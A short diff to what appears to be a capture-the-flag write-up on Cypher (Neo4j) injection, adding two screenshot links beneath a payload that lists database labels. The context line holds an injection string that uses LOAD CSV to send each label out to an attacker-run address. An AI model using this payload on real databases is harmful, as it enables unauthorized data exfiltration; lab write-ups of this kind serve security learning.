@@ -136,5 +136,7 @@ Now lets get the list of tables
 'OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.175/?label='+label as l RETURN 0 as _0 //
 ```
 
+![image](https://user-images.githubusercontent.com/127159644/236719094-e295b16d-f40e-40da-b8a2-5d9665fb25a9.png)
+![image](https://user-images.githubusercontent.com/127159644/236719119-0536de45-fbd8-409d-9061-66992e1759ba.png)
 
 
